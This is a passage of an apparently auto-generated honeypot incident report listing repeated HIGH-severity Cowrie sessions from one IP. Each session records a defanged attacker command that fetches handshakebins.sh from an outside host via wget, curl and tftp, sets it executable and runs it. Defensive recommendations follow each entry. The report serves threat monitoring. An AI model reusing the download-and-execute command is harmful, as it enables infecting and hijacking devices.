| `2026-08-25 09:55:21` | `cowrie.command.success` |
| `2026-08-25 09:55:21` | `cowrie.log.closed` |
| `2026-08-25 09:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f80751a2ca7

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:21` | `cowrie.session.connect` |
| `2026-08-25 09:55:21` | `cowrie.login.success` |
| `2026-08-25 09:55:22` | `cowrie.session.params` |
| `2026-08-25 09:55:22` | `cowrie.command.input` |
| `2026-08-25 09:55:22` | `cowrie.command.success` |
| `2026-08-25 09:55:22` | `cowrie.log.closed` |
| `2026-08-25 09:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dab9cf5fe3c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:23` | `cowrie.session.connect` |
| `2026-08-25 09:55:23` | `cowrie.login.success` |
| `2026-08-25 09:55:23` | `cowrie.session.params` |
| `2026-08-25 09:55:24` | `cowrie.command.input` |
| `2026-08-25 09:55:24` | `cowrie.command.success` |
| `2026-08-25 09:55:24` | `cowrie.log.closed` |
| `2026-08-25 09:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e49d8457d0a

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:24` | `cowrie.session.connect` |
| `2026-08-25 09:55:24` | `cowrie.login.success` |
| `2026-08-25 09:55:25` | `cowrie.session.params` |
| `2026-08-25 09:55:25` | `cowrie.command.input` |
| `2026-08-25 09:55:25` | `cowrie.command.success` |
| `2026-08-25 09:55:25` | `cowrie.log.closed` |
| `2026-08-25 09:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3037b1ceb19

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:26` | `cowrie.session.connect` |
| `2026-08-25 09:55:26` | `cowrie.login.success` |
| `2026-08-25 09:55:26` | `cowrie.session.params` |
| `2026-08-25 09:55:27` | `cowrie.command.input` |
| `2026-08-25 09:55:27` | `cowrie.command.success` |
| `2026-08-25 09:55:27` | `cowrie.log.closed` |
| `2026-08-25 09:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4e9cb61bf2

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:27` | `cowrie.session.connect` |
| `2026-08-25 09:55:27` | `cowrie.login.success` |
| `2026-08-25 09:55:28` | `cowrie.session.params` |
| `2026-08-25 09:55:28` | `cowrie.command.input` |
| `2026-08-25 09:55:28` | `cowrie.command.success` |
| `2026-08-25 09:55:28` | `cowrie.log.closed` |
| `2026-08-25 09:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31d0081eb73

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:29` | `cowrie.session.connect` |
| `2026-08-25 09:55:29` | `cowrie.login.success` |
| `2026-08-25 09:55:29` | `cowrie.session.params` |
| `2026-08-25 09:55:29` | `cowrie.command.input` |
| `2026-08-25 09:55:29` | `cowrie.command.success` |
| `2026-08-25 09:55:30` | `cowrie.log.closed` |
| `2026-08-25 09:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f993ef9334d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:30` | `cowrie.session.connect` |
| `2026-08-25 09:55:30` | `cowrie.login.success` |
| `2026-08-25 09:55:31` | `cowrie.session.params` |
| `2026-08-25 09:55:31` | `cowrie.command.input` |
| `2026-08-25 09:55:31` | `cowrie.command.success` |
| `2026-08-25 09:55:31` | `cowrie.log.closed` |
| `2026-08-25 09:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249a423e932b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:32` | `cowrie.session.connect` |
| `2026-08-25 09:55:32` | `cowrie.login.success` |
| `2026-08-25 09:55:32` | `cowrie.session.params` |
| `2026-08-25 09:55:33` | `cowrie.command.input` |
| `2026-08-25 09:55:33` | `cowrie.command.success` |
| `2026-08-25 09:55:33` | `cowrie.log.closed` |
| `2026-08-25 09:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d29feda2388

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:33` | `cowrie.session.connect` |
| `2026-08-25 09:55:33` | `cowrie.login.success` |
| `2026-08-25 09:55:34` | `cowrie.session.params` |
| `2026-08-25 09:55:34` | `cowrie.command.input` |
| `2026-08-25 09:55:34` | `cowrie.command.success` |
| `2026-08-25 09:55:34` | `cowrie.log.closed` |
| `2026-08-25 09:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49bafa236cd9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:34` | `cowrie.session.connect` |
| `2026-08-25 09:55:35` | `cowrie.login.success` |
| `2026-08-25 09:55:35` | `cowrie.session.params` |
| `2026-08-25 09:55:35` | `cowrie.command.input` |
| `2026-08-25 09:55:35` | `cowrie.command.success` |
| `2026-08-25 09:55:36` | `cowrie.log.closed` |
| `2026-08-25 09:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7215cf1bef1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:36` | `cowrie.session.connect` |
| `2026-08-25 09:55:36` | `cowrie.login.success` |
| `2026-08-25 09:55:37` | `cowrie.session.params` |
| `2026-08-25 09:55:37` | `cowrie.command.input` |
| `2026-08-25 09:55:37` | `cowrie.command.success` |
| `2026-08-25 09:55:37` | `cowrie.log.closed` |
| `2026-08-25 09:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f079c261513

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:37` | `cowrie.session.connect` |
| `2026-08-25 09:55:38` | `cowrie.login.success` |
| `2026-08-25 09:55:38` | `cowrie.session.params` |
| `2026-08-25 09:55:38` | `cowrie.command.input` |
| `2026-08-25 09:55:38` | `cowrie.command.success` |
| `2026-08-25 09:55:39` | `cowrie.log.closed` |
| `2026-08-25 09:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57a75008a12

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:39` | `cowrie.session.connect` |
| `2026-08-25 09:55:39` | `cowrie.login.success` |
| `2026-08-25 09:55:40` | `cowrie.session.params` |
| `2026-08-25 09:55:40` | `cowrie.command.input` |
| `2026-08-25 09:55:40` | `cowrie.command.success` |
| `2026-08-25 09:55:40` | `cowrie.log.closed` |
| `2026-08-25 09:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66f70eec399

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:40` | `cowrie.session.connect` |
| `2026-08-25 09:55:41` | `cowrie.login.success` |
| `2026-08-25 09:55:41` | `cowrie.session.params` |
| `2026-08-25 09:55:41` | `cowrie.command.input` |
| `2026-08-25 09:55:41` | `cowrie.command.success` |
| `2026-08-25 09:55:42` | `cowrie.log.closed` |
| `2026-08-25 09:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc4cf2aab46

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:42` | `cowrie.session.connect` |
| `2026-08-25 09:55:42` | `cowrie.login.success` |
| `2026-08-25 09:55:43` | `cowrie.session.params` |
| `2026-08-25 09:55:43` | `cowrie.command.input` |
| `2026-08-25 09:55:43` | `cowrie.command.success` |
| `2026-08-25 09:55:43` | `cowrie.log.closed` |
| `2026-08-25 09:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c81bc4d8906

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:43` | `cowrie.session.connect` |
| `2026-08-25 09:55:44` | `cowrie.login.success` |
| `2026-08-25 09:55:44` | `cowrie.session.params` |
| `2026-08-25 09:55:44` | `cowrie.command.input` |
| `2026-08-25 09:55:44` | `cowrie.command.success` |
| `2026-08-25 09:55:45` | `cowrie.log.closed` |
| `2026-08-25 09:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4b8adb3bc9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:45` | `cowrie.session.connect` |
| `2026-08-25 09:55:45` | `cowrie.login.success` |
| `2026-08-25 09:55:46` | `cowrie.session.params` |
| `2026-08-25 09:55:46` | `cowrie.command.input` |
| `2026-08-25 09:55:46` | `cowrie.session.file_download` |
| `2026-08-25 09:55:46` | `cowrie.session.file_download` |
| `2026-08-25 09:55:46` | `cowrie.session.file_download` |
| `2026-08-25 09:55:46` | `cowrie.log.closed` |
| `2026-08-25 09:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f0885c6db8

| Field | Detail |
